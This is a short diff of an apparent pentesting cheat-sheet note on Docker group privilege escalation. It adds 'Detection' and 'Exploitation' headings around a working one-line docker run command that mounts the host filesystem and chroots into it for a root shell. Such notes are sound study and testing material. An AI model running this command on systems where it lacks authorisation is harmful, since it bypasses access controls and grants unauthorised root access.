@@ -1,8 +1,10 @@
 # Docker Group Privilege Escalation.
-If we are part of the Docker group we can do the next command to become root.
-
+## Detection.
+We only need to be part of the Docker group.
 ![31](https://github.com/user-attachments/assets/b7c9043b-0bf6-42ec-91cb-15c7dbd6710f)
 
+## Exploitation.
+If we are part of the Docker group we can do the next command to become root.
 ```bash
 docker run -it --rm -v /:/mnt <IMAGE_NAME> chroot /mnt bash
 ```
